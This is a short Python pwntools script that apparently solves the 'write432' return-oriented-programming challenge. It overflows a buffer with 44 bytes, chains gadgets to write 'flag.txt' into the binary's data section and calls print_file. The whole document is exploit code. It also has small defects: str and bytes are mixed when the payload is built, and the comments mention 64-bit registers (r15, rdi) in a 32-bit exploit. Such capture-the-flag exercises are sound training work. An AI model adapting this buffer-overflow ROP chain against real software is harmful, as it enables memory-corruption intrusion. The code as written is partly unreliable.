#! /usr/bin/env python
from pwn import *

gadget1 = 0x080485aa # pop edi ; pop ebp ; ret

gadget2 = 0x08048543 # mov dword ptr [edi], ebp ; ret

dataSect = 0x804a018 # data section address

print_file_plt = 0x80483d0 # plt address of print_file

payload = 'A'*44

r15 = b'flag'

payload += p32(gadget1) + p32(dataSect) +r15 + p32(gadget2) # write string flag.txt to data section

r15 = b'.txt'
payload += p32(gadget1) + p32(dataSect+4) +r15 + p32(gadget2) # write string flag.txt to data section

payload += p32(print_file_plt) # jump to print_file

payload += b'A'*4 # store data section address to rdi register

payload += p32(dataSect)

print(payload)

elf = ELF('./write432')

proc = elf.process()

proc.recvuntil('> ')

proc.sendline(payload)

proc.interactive()
